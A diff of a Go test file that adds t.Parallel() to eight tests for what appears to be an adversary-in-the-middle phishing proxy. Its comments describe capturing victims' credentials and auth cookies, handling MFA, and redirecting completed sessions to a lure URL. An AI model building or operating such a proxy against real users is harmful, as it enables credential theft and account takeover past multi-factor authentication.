@@ -13,6 +13,7 @@ import (
 // TestSessions_CredentialExtraction verifies that a POST to the login path
 // with form-encoded credentials results in the session recording them.
 func TestSessions_CredentialExtraction(t *testing.T) {
+	t.Parallel()
 	harness := test.NewHarness(t)
 
 	harness.UpstreamMux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
@@ -45,6 +46,7 @@ func TestSessions_CredentialExtraction(t *testing.T) {
 // TestSessions_CookieTokenCapture verifies that an auth cookie set by the
 // upstream is captured into the session's cookie tokens.
 func TestSessions_CookieTokenCapture(t *testing.T) {
+	t.Parallel()
 	harness := test.NewHarness(t)
 
 	harness.UpstreamMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
@@ -83,6 +85,7 @@ func TestSessions_CookieTokenCapture(t *testing.T) {
 // TestSessions_CompletesWhenRequiredTokenCaptured verifies that a session is
 // marked complete once the required auth cookie is captured.
 func TestSessions_CompletesWhenRequiredTokenCaptured(t *testing.T) {
+	t.Parallel()
 	harness := test.NewHarness(t)
 
 	harness.UpstreamMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
@@ -111,6 +114,7 @@ func TestSessions_CompletesWhenRequiredTokenCaptured(t *testing.T) {
 // TestSessions_RemainsOpenWithoutRequiredToken verifies that a session stays
 // open when the upstream does not set the required auth cookie.
 func TestSessions_RemainsOpenWithoutRequiredToken(t *testing.T) {
+	t.Parallel()
 	harness := test.NewHarness(t)
 
 	harness.UpstreamMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
@@ -136,6 +140,7 @@ func TestSessions_RemainsOpenWithoutRequiredToken(t *testing.T) {
 // TestSessions_ForcePostInjectsParam verifies that force_post injects
 // the login_source=web parameter into login POSTs that contain an email field.
 func TestSessions_ForcePostInjectsParam(t *testing.T) {
+	t.Parallel()
 	harness := test.NewHarness(t)
 
 	var receivedLoginSource string
@@ -160,6 +165,7 @@ func TestSessions_ForcePostInjectsParam(t *testing.T) {
 // completed session receives a 302 redirect to the lure's redirect URL
 // instead of being proxied upstream.
 func TestSessions_CompletedSessionRedirects(t *testing.T) {
+	t.Parallel()
 	harness := test.NewHarness(t)
 
 	harness.UpstreamMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
@@ -191,6 +197,7 @@ func TestSessions_CompletedSessionRedirects(t *testing.T) {
 // TestSessions_FullLoginFlow simulates the complete form login:
 // lure hit → login POST → MFA POST → session complete with credentials.
 func TestSessions_FullLoginFlow(t *testing.T) {
+	t.Parallel()
 	harness := test.NewHarness(t)
 
 	harness.UpstreamMux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
@@ -267,6 +274,7 @@ func TestSessions_FullLoginFlow(t *testing.T) {
 // TestSessions_StreamEvents verifies that StreamSessions delivers real-time
 // events when a victim session is created and credentials are captured.
 func TestSessions_StreamEvents(t *testing.T) {
+	t.Parallel()
 	harness := test.NewHarness(t)
 
 	harness.UpstreamMux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
